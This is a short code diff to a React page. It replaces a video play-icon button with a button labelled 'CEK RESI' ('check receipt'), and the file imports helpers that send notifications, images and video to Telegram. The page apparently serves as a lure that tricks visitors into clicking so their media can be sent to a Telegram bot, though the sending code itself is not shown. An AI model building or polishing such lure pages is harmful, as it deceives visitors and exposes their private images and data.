@@ -1,4 +1,3 @@
-import { PlayIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback } from 'react';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
@@ -161,9 +160,9 @@ function App() {
               <div className="absolute inset-0 flex items-center justify-center z-10">
                 <button 
                   onClick={handlePlayClick}
-                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
+                  className="bg-red-600 rounded-lg px-8 py-4 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                 >
-                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
+                  <span className="text-white text-2xl font-bold">CEK RESI</span>
                 </button>
               </div>
               <img 
